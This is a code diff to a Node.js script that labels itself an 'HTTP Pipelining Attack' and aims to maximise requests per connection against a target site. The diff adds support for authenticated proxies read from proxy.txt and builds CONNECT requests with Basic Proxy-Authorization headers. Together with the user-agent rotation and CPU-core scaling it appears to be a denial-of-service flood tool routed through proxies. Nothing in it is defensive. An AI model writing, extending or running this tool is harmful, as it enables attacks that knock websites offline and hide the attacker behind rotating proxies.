@@ -1,6 +1,7 @@
 // R10-7: REQUEST-PIPELINE - HTTP Pipelining Attack
 // Focus: Maximize requests per connection
 // Technique: Send multiple requests before reading response
+// Updated: Support authenticated proxies
 
 const net = require('net');
 const tls = require('tls');
@@ -12,12 +13,35 @@ const CPU_CORES = os.cpus().length;
 let proxies = [];
 let userAgents = [];
 
+// Parse proxy line - supports both formats: host:port and host:port:username:password
+function parseProxy(proxyLine) {
+    const parts = proxyLine.split(':');
+    if (parts.length === 4) {
+        return {
+            host: parts[0],
+            port: parseInt(parts[1]),
+            username: parts[2],
+            password: parts[3],
+            auth: true
+        };
+    } else if (parts.length >= 2) {
+        return {
+            host: parts[0],
+            port: parseInt(parts[1]),
+            auth: false
+        };
+    }
+    return null;
+}
+
 // Load proxies and user agents
 try {
-    proxies = fs.readFileSync('proxy.txt', 'utf-8').split('\n')
+    const proxyLines = fs.readFileSync('proxy.txt', 'utf-8').split('\n')
         .map(line => line.trim())
-        .filter(line => line && !line.startsWith('#') && line.includes(':'));
-    console.log(`[R10-7] Loaded ${proxies.length} proxies`);
+        .filter(line => line && !line.startsWith('#'));
+    
+    proxies = proxyLines.map(parseProxy).filter(p => p !== null);
+    console.log(`[R10-7] Loaded ${proxies.length} proxies (${proxies.filter(p => p.auth).length} authenticated)`);
 } catch (e) {
     console.log('[R10-7] No proxy.txt found, running without proxies');
 }
@@ -39,10 +63,22 @@ class PipelineConnection {
     }
     
     connect() {
-        const [proxyHost, proxyPort] = this.proxy.split(':');
-        const netSocket = net.connect(parseInt(proxyPort), proxyHost);
+        const proxyHost = this.proxy.host;
+        const proxyPort = this.proxy.port;
         
-        netSocket.write(`CONNECT ${this.target.hostname}:443 HTTP/1.1\r\nHost: ${this.target.hostname}:443\r\n\r\n`);
+        const netSocket = net.connect(proxyPort, proxyHost);
+        
+        // Build CONNECT request with optional auth
+        let connectReq = `CONNECT ${this.target.hostname}:443 HTTP/1.1\r\nHost: ${this.target.hostname}:443\r\n`;
+        
+        if (this.proxy.auth) {
+            const auth = Buffer.from(`${this.proxy.username}:${this.proxy.password}`).toString('base64');
+            connectReq += `Proxy-Authorization: Basic ${auth}\r\n`;
+        }
+        
+        connectReq += '\r\n';
+        
+        netSocket.write(connectReq);
         
         netSocket.once('data', () => {
             this.socket = tls.connect({
